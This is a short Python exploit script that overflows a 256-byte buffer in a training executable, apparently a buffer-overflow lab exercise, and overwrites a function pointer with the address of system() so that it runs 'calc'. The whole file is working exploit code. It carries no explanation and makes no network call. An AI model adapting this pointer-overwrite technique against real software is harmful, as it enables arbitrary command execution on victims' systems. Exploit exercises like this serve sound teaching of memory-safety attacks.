import sys
from subprocess import Popen, PIPE

buff = b"C" * 0x100                   # buffer
argv1 = "AAAA"
argv2 = "calc"
pointer_fn = b"\x6F\x29\x40\x00"      # _system

payload = buff + pointer_fn 

p1 = Popen("ABO3_VS_2017.exe " + argv1 + " " + argv2, stdin=PIPE)
print ("PID: %s" % hex(p1.pid))
print ("Enter para continuar")

p1.communicate(payload)
p1.wait()
input()